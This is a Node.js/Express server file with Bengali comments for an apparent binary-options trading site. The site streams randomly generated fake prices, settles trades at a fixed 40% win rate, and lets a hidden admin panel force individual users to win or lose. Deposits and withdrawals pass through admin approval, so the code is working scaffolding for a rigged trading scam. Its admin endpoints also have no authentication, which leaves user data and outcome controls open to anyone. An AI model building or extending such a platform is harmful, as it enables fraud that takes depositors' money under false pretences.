const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ইন-মেমোরি ডাটাবেজ
let users = {
  "demo_user": { balance: 1000, control: "normal" } 
};

let transactions = [];

// ট্রেড লজিক (৪০% উইন, ৬০% লস বা অ্যাডমিন কন্ট্রোল)
app.post('/api/trade', (req, res) => {
  const { username, amount, timeframe } = req.body;
  let user = users[username] || { balance: 1000, control: 'normal' };

  if (user.balance < amount) {
    return res.json({ success: false, message: "অপর্যাপ্ত ব্যালেন্স!" });
  }

  let isWin = false;
  if (user.control === 'win') {
    isWin = true;
  } else if (user.control === 'loss') {
    isWin = false;
  } else {
    const randomChance = Math.random() * 100;
    isWin = randomChance < 40; // ৪০% উইন, ৬০% লস
  }

  let profit = isWin ? amount * 1.85 : 0;
  if (isWin) {
    user.balance += (profit - amount);
  } else {
    user.balance -= amount;
  }

  res.json({ success: true, isWin, balance: user.balance, profit });
});

// ডিপোজিট রিকোয়েস্ট
app.post('/api/deposit', (req, res) => {
  const { username, method, amount, trxId } = req.body;
  transactions.push({ id: Date.now(), username, type: 'Deposit', method, amount, trxId, status: 'Pending' });
  res.json({ success: true, message: "ডিপোজিট রিকোয়েস্ট সফলভাবে জমা হয়েছে!" });
});

// উইথড্রল রিকোয়েস্ট
app.post('/api/withdraw', (req, res) => {
  const { username, method, amount, accountNo } = req.body;
  let user = users[username];
  if(user && user.balance >= amount) {
    user.balance -= Number(amount);
    transactions.push({ id: Date.now(), username, type: 'Withdraw', method, amount, accountNo, status: 'Pending' });
    res.json({ success: true, message: "উইথড্র রিকোয়েস্ট সফলভাবে জমা হয়েছে!" });
  } else {
    res.json({ success: false, message: "পর্যাপ্ত ব্যালেন্স নেই!" });
  }
});

// সিক্রেট অ্যাডমিন পেজ রুট (ইউজার সাইট থেকে আলাদা)
app.get('/admin-secret-panel', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// অ্যাডমিন ডাটা API
app.get('/api/admin/data', (req, res) => {
  let totalDeposit = transactions.filter(t => t.type === 'Deposit' && t.status === 'Approved').reduce((sum, t) => sum + Number(t.amount), 0);
  let totalWithdraw = transactions.filter(t => t.type === 'Withdraw' && t.status === 'Approved').reduce((sum, t) => sum + Number(t.amount), 0);
  res.json({ users, transactions, totalDeposit, totalWithdraw });
});

// অ্যাডমিন অ্যাকশন
app.post('/api/admin/action', (req, res) => {
  const { username, action, value } = req.body;
  if(users[username]) {
    if(action === 'control') users[username].control = value;
    res.json({ success: true });
  } else {
    res.json({ success: false });
  }
});

app.post('/api/admin/tx-action', (req, res) => {
  const { txId, status } = req.body;
  let tx = transactions.find(t => t.id == txId);
  if(tx) {
    tx.status = status;
    res.json({ success: true });
  } else {
    res.json({ success: false });
  }
});

// রিয়েল-टाइम প্রাইস ফিড
wss.on('connection', (ws) => {
  setInterval(() => {
    let dummyPrice = (1.0800 + Math.random() * 0.0050).toFixed(4);
    ws.send(JSON.stringify({ type: 'PRICE_UPDATE', price: dummyPrice }));
  }, 1000);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
